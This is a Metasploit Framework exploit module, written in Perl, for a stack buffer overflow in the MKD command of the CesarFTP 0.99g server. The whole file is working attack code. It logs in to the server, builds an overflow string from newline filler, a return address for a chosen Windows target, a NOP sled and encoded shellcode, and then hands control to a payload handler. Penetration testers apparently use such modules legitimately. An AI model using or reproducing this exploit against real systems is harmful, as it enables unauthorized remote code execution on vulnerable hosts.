
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::cesarftp_mkd;

use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'  => 'Cesar FTP 0.99g MKD Command Buffer Overflow',
	'Version'  => '$Revision: 1.0 $',
	'Authors' =>
	  [
		'y0 <y0[at]w00t-shell.net>',
	  ],
	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000', 'winxp', 'win2003'],
	'Priv'  => 1,
	'AutoOpts'  => { 'EXITFUNC' => 'thread' },
	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 21],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
		'USER'  => [1, 'DATA', 'Username', 'metasploit'],
		'PASS'  => [1, 'DATA', 'Password', 'metasploit'],
	  },

	'Payload' =>
	  {
		'Space'     => 250,
		'BadChars'  => "\x00\x20\x0a\x0d",
		'Prepend'   => "\x81\xc4\xff\xef\xff\xff\x44",
		'Keys'      => ['+ws2ord'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
		This module exploits a stack overflow in the MKD verb in
		CesarFTP 0.99g. 
}),

	'Refs'  =>
	  [
		['URL', 'http://secunia.com/advisories/20574/'],
	  ],

	'DefaultTarget' => 0,
	'Targets' =>
	  [
		[ 'Windows 2000 SP4 English', 0x77e14c29 ],
		[ 'Windows XP SP2 English',   0x76b43ae0 ],
		[ 'Windows 2003 SP1 English', 0x76AA679b ],
	  ],

	'Keys' => ['ftp'],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $targetHost  = $self->GetVar('RHOST');
	my $targetPort  = $self->GetVar('RPORT');
	my $targetIndex = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target      = $self->Targets->[$targetIndex];

	my $s = $self->Login;
	return if ! $s;

	$self->PrintLine(sprintf("[*] Trying to exploit target %s 0x%.8x", $target->[0], $target->[1]));

	my $filler =
	  ("\n" x 671). Pex::Text::AlphaNumText(3).
	  pack('V', $target->[1]). $self->MakeNops(40);

	my $sploit =
	  "MKD ". $filler. $shellcode. "\r\n";

	$s->Send($sploit);

	$self->Handler($s);
	sleep(2);
	return;
}

sub Login {
	my $self = shift;

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $self->GetVar('RHOST'),
		'PeerPort'  => $self->GetVar('RPORT'),
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: '.$s->GetError);
		return;
	}

	my $res = $s->Recv(-1, 20);

	if (! $res || $res !~ /CesarFTP 0\.99g/) {
		$self->PrintLine("[*] The service did not return a valid banner");
		return;
	}

	$self->PrintLine("[*] REMOTE> ". $self->CleanData($res));

	$s->Send("USER ". $self->GetVar('USER') ."\r\n");
	$res = $s->Recv(-1, 10);
	$self->PrintLine("[*] REMOTE> ". $self->CleanData($res));
	if ($res !~ /^331/) {
		$s->Close;
		return;
	}

	$s->Send("PASS ". $self->GetVar('PASS') ."\r\n");
	$res = $s->Recv(-1, 10);
	$self->PrintLine("[*] REMOTE> ". $self->CleanData($res));
	if ($res !~ /^230/) {
		$s->Close;
		return;
	}

	return $s;
}

sub CleanData {
	my $self = shift;
	my $data = shift;
	$data =~ s/\r|\n//g;
	return $data;
}

1;
